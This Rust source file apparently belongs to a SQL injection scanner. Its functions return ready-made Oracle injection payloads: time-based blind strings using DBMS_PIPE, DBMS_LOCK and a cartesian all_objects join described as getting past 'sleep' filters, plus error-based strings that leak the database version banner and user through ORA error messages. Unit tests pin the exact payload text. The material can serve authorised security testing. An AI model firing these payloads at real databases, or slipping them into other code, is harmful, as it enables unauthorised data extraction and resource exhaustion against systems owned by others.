#![deny(unsafe_code)]
#[must_use]
pub fn oracle_time(secs: u64) -> String {
    format!("' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{secs}) --")
}

/// Alternate channel: `DBMS_LOCK.SLEEP` where `DBMS_PIPE` is blocked.
#[must_use]
pub fn oracle_time_lock(secs: u64) -> String {
    format!("' AND DBMS_LOCK.SLEEP({secs}) --")
}

/// Heavy-query variant without `DBMS_PIPE`/`DBMS_LOCK` (P0-5): filtered
/// stacks that reject `sleep` still run dictionary cartesian joins. An
/// `all_objects` self-join multiplies rows quadratically, burning seconds
/// of CPU. Fixed cost; caller keeps `sleep_secs` for threshold math, same
/// contract as the MySQL fixed `BENCHMARK`.
#[must_use]
pub fn oracle_time_heavy() -> String {
    "' AND (SELECT COUNT(*) FROM all_objects A, all_objects B)>0 --".to_owned()
}

/// Canonical Oracle error-based set — legacy first (compat), then variants.
///
/// - `[0]` legacy `CTXSYS.DRITHSX.SN` — banner leak channel
/// - `[1]` legacy `UTL_INADDR.GET_HOST_ADDRESS`
/// - `TO_NUMBER(banner)` — ORA-01722 (`invalid number`) channel
/// - `XMLTYPE(banner)` — `ORA-06502` / XML parsing error channel
/// - `DBMS_XDB.GETREPOSITORYRESCONTENT(banner)` — XDB URI error channel
#[must_use]
pub fn oracle_error_payloads() -> Vec<String> {
    vec![
        "' AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1)) --"
            .to_owned(),
        "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)) --".to_owned(),
        "' AND 1=TO_NUMBER((SELECT banner FROM v$version WHERE ROWNUM=1)) --".to_owned(),
        "' AND XMLTYPE((SELECT banner FROM v$version WHERE ROWNUM=1))='1' --".to_owned(),
        "' AND 1=DBMS_XDB.GETREPOSITORYRESCONTENT((SELECT banner FROM v$version WHERE ROWNUM=1)) --"
            .to_owned(),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn legacy_shape() {
        assert_eq!(oracle_time(5), "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5) --");
    }

    #[test]
    fn lock_shape() {
        assert_eq!(oracle_time_lock(5), "' AND DBMS_LOCK.SLEEP(5) --");
    }

    #[test]
    fn heavy_has_no_sleep_keyword() {
        // P0-5: dictionary cartesian burn passes `sleep` filters.
        let p = oracle_time_heavy();
        assert_eq!(
            p,
            "' AND (SELECT COUNT(*) FROM all_objects A, all_objects B)>0 --"
        );
        assert!(!p.to_ascii_lowercase().contains("sleep"), "{p}");
        assert!(!p.contains("DBMS_PIPE"), "{p}");
    }
}
